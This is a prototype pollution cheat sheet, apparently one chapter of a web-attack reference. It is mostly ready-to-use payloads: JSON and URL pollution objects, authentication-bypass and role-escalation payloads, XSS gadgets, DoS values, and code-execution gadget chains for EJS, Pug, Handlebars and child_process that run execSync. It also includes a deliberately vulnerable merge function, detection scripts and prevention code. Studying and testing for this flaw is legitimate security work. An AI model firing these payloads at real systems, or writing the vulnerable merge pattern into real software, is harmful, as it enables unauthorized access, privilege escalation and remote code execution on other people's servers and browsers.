# Prototype Pollution

## Table of Contents

- [Overview](#overview)
- [Server-Side Prototype Pollution](#server-side-prototype-pollution)
- [Client-Side Prototype Pollution](#client-side-prototype-pollution)
- [Detection](#detection)
- [Exploitation](#exploitation)
- [Gadgets](#gadgets)

---

## Overview

Prototype Pollution is a JavaScript vulnerability that allows attackers to modify the prototype of base objects (like `Object.prototype`), affecting all objects in the application.

**Impact:**

- Remote Code Execution (RCE)
- Cross-Site Scripting (XSS)
- Denial of Service (DoS)
- Authentication Bypass

---

## Server-Side Prototype Pollution

### JSON Merge Operations

> Vulnerable merge function

```javascript
// Vulnerable code
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

> Exploit payload

```json
{
    "__proto__": {
        "isAdmin": true
    }
}
```

### Common Vulnerable Functions

| Library | Function |
| :--- | :--- |
| lodash | `_.merge()`, `_.mergeWith()`, `_.set()` |
| jQuery | `$.extend(true, {}, obj)` |
| Hoek | `merge()` |
| deeps | `extend()` |

### Express.js Body Parser

> POST request with pollution

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{
    "username": "test",
    "__proto__": {
        "admin": true
    }
}
```

> Alternative keys

```json
{"constructor": {"prototype": {"admin": true}}}
```

---

## Client-Side Prototype Pollution

### DOM-based Pollution

> Via URL parameters

```text
https://target.com/?__proto__[admin]=true
https://target.com/?__proto__.admin=true
https://target.com/#__proto__[admin]=true
```

> Via URL fragment

```text
https://target.com/#constructor.prototype.admin=true
```

### jQuery Pollution

> Via $.extend

```javascript
let malicious = JSON.parse('{"__proto__": {"xss": "<img src=x onerror=alert(1)>"}}');
$.extend(true, {}, malicious);
```

### Common Entry Points

- URL query parameters
- URL hash fragments  
- `postMessage` data
- Web storage (localStorage/sessionStorage)
- JSON responses

---

## Detection

### Manual Testing

> Test payloads for JSON body

```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```

> Check if pollution worked

```javascript
// In browser console or Node.js
console.log({}.polluted); // Should be true if vulnerable
```

### URL Parameter Testing

```text
?__proto__[test]=polluted
?__proto__.test=polluted
?constructor[prototype][test]=polluted
```

### Detection Script

```javascript
// Check for existing pollution
function checkPollution() {
    const obj = {};
    if (obj.polluted) {
        console.log("Object.prototype is polluted!");
        console.log("Polluted properties:", Object.keys(Object.prototype));
    }
}

// Test pollution
function testPollution(payload) {
    try {
        const parsed = JSON.parse(payload);
        Object.assign({}, parsed);
        return {}.testProp !== undefined;
    } catch (e) {
        return false;
    }
}
```

### Server-Side Detection

> Node.js status check endpoint

```javascript
// Add to Express app for testing
app.get('/debug/proto', (req, res) => {
    const obj = {};
    res.json({
        polluted: Object.keys(Object.prototype).length > 0,
        properties: Object.keys(Object.prototype)
    });
});
```

---

## Exploitation

### Remote Code Execution (RCE)

> Exploiting child_process.spawn

```json
{
    "__proto__": {
        "shell": "/proc/self/exe",
        "argv0": "console.log(require('child_process').execSync('id').toString())//"
    }
}
```

> Via NODE_OPTIONS

```json
{
    "__proto__": {
        "NODE_OPTIONS": "--require /proc/self/fd/0"
    }
}
```

### EJS Template Engine RCE

```json
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
    }
}
```

### Pug Template Engine RCE

```json
{
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('id')"
        }
    }
}
```

### Handlebars RCE

```json
{
    "__proto__": {
        "type": "Program",
        "body": [{
            "type": "MustacheStatement",
            "path": "process.mainModule.require('child_process').execSync('id')",
            "params": [],
            "hash": null
        }]
    }
}
```

---

## Gadgets

### XSS Gadgets (Client-Side)

> innerHTML gadget

```text
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

> srcdoc gadget

```text
?__proto__[srcdoc]=<script>alert(1)</script>
```

> data-* attributes

```text
?__proto__[data-bind]=<img src=x onerror=alert(1)>
```

### Authentication Bypass

> isAdmin property

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"admin": true}}
{"__proto__": {"role": "admin"}}
```

> Bypass authentication checks

```json
{"__proto__": {"authenticated": true}}
{"__proto__": {"verified": true}}
```

### DoS Gadgets

> toString override

```json
{
    "__proto__": {
        "toString": "crash"
    }
}
```

> Length manipulation

```json
{
    "__proto__": {
        "length": 9999999999
    }
}
```

---

## Common Payloads

### JSON Payloads

```json
// Basic pollution
{"__proto__": {"polluted": true}}

// Constructor path
{"constructor": {"prototype": {"polluted": true}}}

// Nested pollution
{"a": {"__proto__": {"polluted": true}}}

// Array pollution
[{"__proto__": {"polluted": true}}]
```

### URL Payloads

```text
# Query string
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true

# Hash fragment
#__proto__[polluted]=true
#__proto__.polluted=true
```

### Deep Property Access

```json
{
    "__proto__": {
        "__proto__": {
            "polluted": true
        }
    }
}
```

---

## Prevention

### Safe Merge Functions

```javascript
// Safe merge that ignores __proto__
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = safeMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### Object.create(null)

```javascript
// Create object without prototype
const safeObj = Object.create(null);
```

### Object.freeze

```javascript
// Freeze Object.prototype
Object.freeze(Object.prototype);
```

---

## Tools

| Tool | Description |
| :--- | :--- |
| PPScan | Server-side prototype pollution scanner |
| DOM Invader | Burp Suite extension for DOM-based pollution |
| ppfuzz | Prototype pollution fuzzer |

### Burp Suite Detection

1. Install DOM Invader extension
2. Enable prototype pollution detection
3. Browse application
4. Check for pollution indicators

---

## Quick Reference

### Detection Payloads

| Context | Payload |
| :--- | :--- |
| JSON Body | `{"__proto__": {"test": true}}` |
| URL Param | `?__proto__[test]=true` |
| URL Hash | `#__proto__[test]=true` |

### RCE Payloads by Template

| Template | Property |
| :--- | :--- |
| EJS | `outputFunctionName` |
| Pug | `block.type` |
| Handlebars | `type`, `body` |

### Bypass Payloads

| Goal | Payload |
| :--- | :--- |
| Admin access | `{"__proto__": {"isAdmin": true}}` |
| Auth bypass | `{"__proto__": {"authenticated": true}}` |
| Role escalation | `{"__proto__": {"role": "admin"}}` |

---

## ðŸ“š See Also

### Related Web Attacks

- **[Cross-Site Scripting (XSS)](7.2.Cross-Site-Scripting.md)** - Client-side prototype pollution to XSS
- **[SSTI](7.6.SSTI.md)** - Server-side template injection
- **[Command Injection](7.4.Command-Injection.md)** - RCE through prototype pollution gadgets
